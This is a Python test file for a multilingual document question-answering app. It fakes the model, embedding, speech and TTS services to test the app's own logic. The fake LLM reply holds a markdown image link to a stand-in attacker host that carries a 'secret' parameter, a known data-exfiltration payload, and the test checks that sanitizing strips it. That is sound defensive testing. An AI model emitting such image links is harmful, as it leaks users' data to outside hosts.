"""
test_app_logic.py - offline tests 

Real model / LLM / speech services are replaced by fakes, so this checks OUR logic:
document processing, the RAG entry, sanitizing, TTS voice choice, voice errors and
that app.py starts and shows the right warnings.

Run:  python test_app_logic.py
"""
import hashlib
import io
import sys
import tempfile
import wave
from pathlib import Path
from types import SimpleNamespace

import numpy as np

import config
from modules import embeddings, llm, prompts, tts, utils, voice_input

# ---- fakes -----------------------------------------------------------------
DIM = 256


def fake_encode(texts):
    out = np.zeros((len(texts), DIM), dtype="float32")
    for row, text in enumerate(texts):
        for word in text.lower().replace("?", " ").replace(".", " ").split():
            out[row, int(hashlib.md5(word.encode()).hexdigest(), 16) % DIM] += 1.0
    return out / np.maximum(np.linalg.norm(out, axis=1, keepdims=True), 1e-9)


embeddings._encode = fake_encode
llm._get_client = lambda: SimpleNamespace(chat=SimpleNamespace(completions=SimpleNamespace(
    create=lambda **kw: SimpleNamespace(choices=[SimpleNamespace(message=SimpleNamespace(
        content="Fake answer ![x](http://evil.example/?q=secret)"))]))))
config.LLM_API_KEY, config.LLM_MODEL = "k", "m"

tmp = Path(tempfile.mkdtemp())
config.UPLOAD_DIR, config.VECTORSTORE_DIR = tmp / "up", tmp / "vs"

SAMPLE = ("Machine learning lets computers learn patterns from data instead of fixed rules.\n\n"
          "The Taj Mahal is a marble mausoleum in Agra built by Emperor Shah Jahan.\n\n"
          "Vector databases store embeddings and find similar items quickly.")

# ---- document processing ---------------------------------------------------
store, info = utils.process_document("sample.txt", SAMPLE.encode("utf-8"))
assert info.chunks >= 1 and info.language == "English" and info.pages is None
assert (config.VECTORSTORE_DIR / "chroma.sqlite3").exists()
print(f"PASS  process_document: {info.chunks} chunk(s), language={info.language}, index saved")

utils.relabel_language(store, info, "Hindi")
assert all(c.metadata["language"] == "Hindi" for c in store.chunks)
print("PASS  manual language correction updates the metadata")

for bad_name, bad_data, msg in [("x.exe", b"1", "not currently supported"), ("e.txt", b"  \n ", "No readable text")]:
    try:
        utils.process_document(bad_name, bad_data)
        raise AssertionError("should fail")
    except Exception as exc:
        assert msg in str(exc), exc
print("PASS  unsupported / empty files give the specified messages")

# ---- RAG entry --------------------------------------------------------------
entry = utils.run_rag(store, "Who built the Taj Mahal in Agra?", "English", "Simple", 3, 0.2)
assert entry["used_llm"] and entry["sources"] and "evil.example" not in entry["answer"]
assert entry["sources"][0]["metadata"]["source"] == "sample.txt"
print("PASS  run_rag returns answer + sources; markdown image stripped from the answer")

entry = utils.run_rag(store, "quantum banana spaceship", "Hindi", "Simple", 3, 0.2)
assert not entry["used_llm"] and entry["answer"] == prompts.NOT_FOUND["Hindi"]
print("PASS  irrelevant question -> fixed 'not found' reply, LLM not called")

# ---- TTS voice choice ---------------------------------------------------------
calls = []


class FakeGTTS:
    def __init__(self, text, lang, tld="com"):
        calls.append((lang, tld))

    def write_to_fp(self, fp):
        fp.write(b"MP3")


import gtts
gtts.gTTS = FakeGTTS

audio, note = tts.synthesize("यह एक परीक्षण है।", "Hindi")
assert audio == b"MP3" and calls[-1][0] == "hi" and note == ""
audio, note = tts.synthesize("Yeh ek test hai.", "Hindi")
assert calls[-1] == ("en", "co.in") and "Indian-English" in note
audio, note = tts.synthesize("संस्कृतं भाषा अस्ति।", "Sanskrit")
assert calls[-1][0] == "hi" and "fallback" in note.lower()
audio, note = tts.synthesize("**Bold** answer", "English")
assert calls[-1][0] == "en" and note == ""
print("PASS  TTS picks Hindi voice for Devanagari, Indian-English for Roman text, notes fallbacks")

# ---- voice -------------------------------------------------------------------
import speech_recognition as sr


def silent_wav(seconds=1):
    buf = io.BytesIO()
    with wave.open(buf, "wb") as w:
        w.setnchannels(1); w.setsampwidth(2); w.setframerate(16000)
        w.writeframes(b"\x00\x00" * 16000 * seconds)
    return buf.getvalue()


seen = {}
sr.Recognizer.recognize_google = lambda self, audio, language="en-US": seen.update(lang=language) or "  what is AI  "
assert voice_input.transcribe(silent_wav(), "Marathi") == "what is AI" and seen["lang"] == "mr-IN"
assert voice_input.transcribe(silent_wav(), "Haryanvi") == "what is AI" and seen["lang"] == "hi-IN"


def raise_unknown(self, audio, language="en-US"):
    raise sr.UnknownValueError()


def raise_request(self, audio, language="en-US"):
    raise sr.RequestError("offline")


sr.Recognizer.recognize_google = raise_unknown
try:
    voice_input.transcribe(silent_wav(), "English"); raise AssertionError
except voice_input.VoiceError as e:
    assert str(e) == "⚠️ I couldn't understand the audio. Please try again."
sr.Recognizer.recognize_google = raise_request
try:
    voice_input.transcribe(silent_wav(), "English"); raise AssertionError
except voice_input.VoiceError as e:
    assert "could not be reached" in str(e)
try:
    voice_input.transcribe(b"not audio", "English"); raise AssertionError
except voice_input.VoiceError as e:
    assert "couldn't understand" in str(e)
print("PASS  voice: locale mapping (mr-IN, hi-IN fallback) and all error messages")

# ---- app.py smoke test ---------------------------------------------------------
try:
    from streamlit.testing.v1 import AppTest
except ImportError:
    print("SKIP  AppTest not available in this Streamlit version")
    sys.exit(0)

at = AppTest.from_file("app.py", default_timeout=60).run()
assert not at.exception, at.exception
assert any("BhashaRAG" in m.value for m in at.markdown)
print("PASS  app.py starts without errors")

at.text_input[0].input("What is AI?")
next(b for b in at.button if b.label == "Ask Question").click()
at.run()
assert not at.exception, at.exception
assert any("Please upload a document first" in w.value for w in at.warning), [w.value for w in at.warning]
print("PASS  asking without a document shows: ⚠️ Please upload a document first.")
